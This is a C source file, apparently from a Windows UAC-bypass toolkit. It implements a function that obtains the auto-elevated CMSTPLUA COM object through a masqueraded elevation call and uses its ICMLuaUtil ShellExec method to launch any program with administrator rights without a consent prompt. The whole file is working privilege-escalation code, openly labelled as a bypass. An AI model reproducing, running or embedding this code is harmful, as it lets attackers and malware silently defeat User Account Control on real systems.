/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2017
*
*  TITLE:       API0CRADLE.C
*
*  VERSION:     2.79
*
*  DATE:        16 Aug 2017
*
*  UAC bypass method from Oddvar Moe aka api0cradle.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

/*
* ucmCMLuaUtilShellExecMethod
*
* Purpose:
*
* Bypass UAC using AutoElevated undocumented CMLuaUtil interface.
*
*/
BOOL ucmCMLuaUtilShellExecMethod(
    _In_ LPWSTR lpszExecutable
)
{
    HRESULT          r = E_FAIL;
    BOOL             bCond = FALSE;
    IID              xIID_ICMLuaUtil;
    CLSID            xCLSID_ICMLuaUtil;
    ICMLuaUtil      *CMLuaUtil = NULL;

    do {

        if (lpszExecutable == NULL)
            break;

        if (CLSIDFromString(T_CLSID_CMSTPLUA, &xCLSID_ICMLuaUtil) != NOERROR) {
            break;
        }
        if (IIDFromString(T_IID_ICMLuaUtil, &xIID_ICMLuaUtil) != S_OK) {
            break;
        }

        r = ucmMasqueradedCoGetObjectElevate(
            T_CLSID_CMSTPLUA,
            CLSCTX_LOCAL_SERVER,
            &xIID_ICMLuaUtil,
            &CMLuaUtil);

        if (r != S_OK)
            break;

        if (CMLuaUtil == NULL) {
            r = E_FAIL;
            break;
        }

        r = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil, 
            lpszExecutable, 
            NULL, 
            NULL, 
            SEE_MASK_DEFAULT, 
            SW_SHOW);

    } while (bCond);

    if (CMLuaUtil != NULL) {
        CMLuaUtil->lpVtbl->Release(CMLuaUtil);
    }

    return SUCCEEDED(r);
}
